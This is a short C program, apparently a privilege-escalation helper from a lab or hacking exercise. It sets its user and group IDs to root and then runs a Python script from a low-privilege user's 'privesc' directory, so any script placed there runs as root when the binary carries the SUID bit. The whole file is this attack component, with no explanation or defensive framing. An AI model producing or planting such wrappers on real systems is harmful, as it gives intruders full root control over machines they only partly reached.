int main()
{
	setuid(0);
	setgid(0);
	system("/home/lowpriv/privesc/privescs.py");
	return 0;
}
